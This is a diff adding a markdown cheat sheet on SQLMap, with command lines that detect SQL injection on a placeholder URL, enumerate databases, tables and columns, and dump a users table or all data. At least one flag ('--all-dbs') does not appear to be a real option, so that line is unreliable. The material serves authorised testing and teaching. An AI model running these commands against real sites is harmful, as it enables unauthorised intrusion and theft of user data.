@@ -1,0 +1,48 @@
+## 🧬 SQLMap – SQL Injection Exploitation Tool
+
+**SQLMap** is a powerful command-line tool used to detect and exploit SQL injection vulnerabilities in web applications.  
+It supports multiple SQL injection techniques including boolean-based, time-based, error-based, union-based, and stacked queries.
+
+SQLMap automates the entire process of identifying injectable parameters and extracting database information.
+
+### 🔹 Common SQLMap Usage
+
+```bash
+# Basic SQL injection scan
+sqlmap -u "https://www.example.com/page?id=1"
+
+# Run non-interactively (recommended for automation)
+sqlmap -u "https://www.example.com/page?id=1" --batch
+
+# Suppress most output (useful for scripting)
+sqlmap -u "https://www.example.com/page?id=1" --quiet
+
+# Detect SQL injection and list databases
+sqlmap -u "https://www.example.com/page?id=1" --dbs
+
+# Enumerate tables in a specific database
+sqlmap -u "https://www.example.com/page?id=1" -D dbname --tables
+
+# Enumerate columns in a table
+sqlmap -u "https://www.example.com/page?id=1" -D dbname -T users --columns
+
+# Dump data from a specific table
+sqlmap -u "https://www.example.com/page?id=1" -D dbname -T users --dump
+
+# Dump all databases
+sqlmap -u "https://www.example.com/page?id=1" --all-dbs
+
+# Time-based blind SQL injection
+sqlmap -u "https://www.example.com/page?id=1" --technique=T --time-sec=5
+
+# Union-based SQL injection
+sqlmap -u "https://www.example.com/page?id=1" --technique=U
+
+# Inject using POST data
+sqlmap -u "https://www.example.com/page?id=1" --data="param=value"
+
+# Save output to a custom directory
+sqlmap -u "https://www.example.com/page?id=1" --output-dir=sqlmap_results
+
+# Use SQLMap configuration file
+sqlmap -c sqlmapconfig.conf
